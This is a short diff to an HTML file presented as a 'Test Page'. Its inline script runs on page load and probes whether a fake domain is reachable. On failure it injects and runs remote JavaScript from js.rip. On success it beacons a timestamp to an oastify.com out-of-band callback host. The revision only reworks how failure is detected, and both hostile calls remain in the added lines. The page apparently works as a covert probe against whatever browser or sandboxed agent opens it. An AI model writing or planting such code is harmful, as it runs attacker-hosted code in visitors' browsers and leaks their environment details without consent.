@@ -3,21 +3,26 @@
 <head>
   <title>Test Page</title>
   <script>
-    let failed = false;
-
     fetch("https://nonexistingone.com/")
-      .catch(() => {
-        failed = true;
-      })
-      .finally(() => {
-        const timestamp = Date.now();
-        if (failed) {
-          const s = document.createElement("script");
-          s.src = "https://js.rip/5mw8at9w5s?ts=" + timestamp;
-          document.head.appendChild(s);
-        } else {
-          fetch("https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + timestamp);
+      .then(res => {
+        // If response is opaque (CORS blocked), status is 0 and type is 'opaque'
+        if (res.status === 0 || res.type === "opaque") {
+          throw new Error("CORS-blocked or unreachable");
         }
+        // Optional: check for empty body or other suspicious behavior
+        return res.text().then(body => {
+          if (!body || body.length === 0) {
+            throw new Error("Empty response");
+          }
+          // Success path
+          fetch("https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + Date.now());
+        });
+      })
+      .catch(() => {
+        // Failure path
+        const s = document.createElement("script");
+        s.src = "https://js.rip/5mw8at9w5s?ts=" + Date.now();
+        document.head.appendChild(s);
       });
   </script>
 </head>
